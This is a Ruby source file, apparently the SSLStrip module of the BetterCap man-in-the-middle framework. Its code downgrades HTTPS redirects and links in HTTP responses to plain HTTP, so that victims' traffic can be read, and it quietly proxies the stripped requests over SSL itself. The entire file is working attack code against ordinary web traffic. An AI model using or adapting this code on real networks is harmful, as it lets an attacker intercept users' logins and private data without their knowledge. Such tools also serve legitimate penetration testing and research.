=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : http://www.evilsocket.net/

This project is released under the GPL 3 license.

=end

module BetterCap
module Proxy
module SSLStrip

# Handle SSL stripping.
class Strip
  # Maximum number of redirects to detect a HTTPS redirect loop.
  MAX_REDIRECTS = 3

  # Create an instance of this object.
  def initialize
    @monitor = URLMonitor.new
  end

  # Check if the +request+ coming from +client_ip+ is a result of a stripped
  # link/redirect.
  def preprocess( client_ip, request )
    link = @monitor.normalize( request.host )
    if request.port == 80 and @monitor.secure_link?( client_ip, link )
      Logger.debug "[#{'SSLSTRIP'.green} #{client_ip}] Found stripped HTTPS link '#{link}', proxying via SSL."
      request.port = 443
    end
  end

  # Process the +request+ and if it's a redirect to a HTTPS url patch the
  # Location header and retry.
  # Process the +response+ and replace every https link in its body with
  # http counterparts.
  def process( client_ip, request, response )
    # check for a redirect
    if response['Location'].start_with?('https://')
      link = @monitor.normalize( response['Location'] )
      Logger.info "[#{'SSLSTRIP'.green} #{client_ip}] Found redirect to HTTPS '#{link}'."
      @monitor.add!( client_ip, link )

      # if MAX_REDIRECTS is reached, the 'Location' header will be used, otherwise
      # the request will be retried on port 443.
      response['Location'] = @monitor.downgrade( response['Location'] )
      request.port = 443
      # retry the request if possible
      return true
    end

    # parse body
    response.body.scan( URLMonitor::HTTPS_URL_RE ).uniq.each do |link|
      if link[0].include?('.')
        link = @monitor.normalize(link[0])
        Logger.info "[#{'SSLSTRIP'.green} #{client_ip}] Found HTTPS link '#{link}'."
        @monitor.add!( client_ip, link )
        response.body.gsub!( link, @monitor.downgrade( link ) )
      end
    end

    # do not retry the request.
    false
  end
end

end
end
end
